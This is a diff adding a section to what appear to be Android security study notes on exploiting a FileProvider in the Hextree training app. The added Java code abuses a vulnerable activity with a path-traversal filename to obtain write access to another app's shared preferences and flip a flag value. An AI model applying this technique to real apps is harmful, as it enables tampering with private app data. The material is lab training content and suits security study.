@@ -5,6 +5,8 @@
 - [Hijacking Content Provider Access](#hijacking-content-provider-access)
 - [The AndroidX FileProvider](#the-androidx-fileprovider)
     - [How to Access FileProvider](#how-to-access-fileprovider)
+    - [FileProvider Write Access](#fileprovider-write-access)
+
 
 
 ## Overview
@@ -266,7 +268,7 @@ button.setOnClickListener(v -> {
 
 ### Insecure root-path FileProvider Config
 ```java
-// Vulnerable class
+// the same Vulnerable class
   public void onCreate(Bundle bundle) {
         super.onCreate(bundle);
         String stringExtra = getIntent().getStringExtra("filename");
@@ -313,6 +315,63 @@ button.setOnClickListener(v -> {
     - `root_files` which configuration entry is used
     - `/data/data/io.hextree.attacksurface/files/secret.txt` the path of the file relative to the configured path, which is mapped to the filesystem root!
 - In itself the `<root-path>` configuration is not actually insecure, as long as only trusted files are shared. But if the app allows an attacker to control the path to any file, it can be used to expose arbitrary internal files.
+
+### FileProvider Write Access
+- Besides sharing content providers with read permissions, an app can also share write permissions
+```java
+// ...
+intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+intent.addFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
+```
+
+> [!NOTE]
+> In decompiled code the integer constants FLAG_GRANT_READ_URI_PERMISSION are probably directly referenced. Which means:
+> `addFlags(1)` = FLAG_GRANT_READ_URI_PERMISSION
+> `addFlags(2)` = FLAG_GRANT_WRITE_URI_PERMISSION
+> `addFlags(3)` = both FLAG_GRANT_READ_URI_PERMISSION | FLAG_GRANT_WRITE_URI_PERMISSION
+
+- We can exploit the same vulnerable class to access the shared preferences and edit them as follows:
+```java
+Button button = findViewById(R.id.click);
+        button.setOnClickListener(v -> {
+            Intent intent = new Intent();
+            intent.putExtra("filename", "../shared_prefs/Flag36Preferences.xml");
+            intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag35Activity");
+            startActivityForResult(intent, 42);
+        });
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode != 42 || data == null || data.getData() == null) return;
+
+        Uri uri = data.getData();
+
+        // 1) Read the whole file
+        StringBuilder sb = new StringBuilder();
+        try (InputStream in = getContentResolver().openInputStream(uri);
+             BufferedReader br = new BufferedReader(new InputStreamReader(in))) {
+            String line;
+            while ((line = br.readLine()) != null) sb.append(line).append('\n');
+        } catch (IOException e) {
+            Log.e("Hextree", "Read failed", e);
+            return;
+        }
+
+        // 2) Toggle the boolean
+        String xml = sb.toString().replace("value=\"false\"", "value=\"true\"");
+
+        // 3) Write it back — use "rwt" to truncate/replace
+        try (OutputStream out = getContentResolver().openOutputStream(uri, "rwt")) {
+            if (out == null) throw new IOException("openOutputStream returned null");
+            out.write(xml.getBytes(StandardCharsets.UTF_8));
+            out.flush();
+            Toast.makeText(this, "Flag updated", Toast.LENGTH_SHORT).show();
+        } catch (IOException e) {
+            Log.e("Hextree", "Write failed", e);
+        }
+    }
+```
 
 ## Resources
 - [Oversecured - Content Provider](https://blog.oversecured.com/Gaining-access-to-arbitrary-Content-Providers)
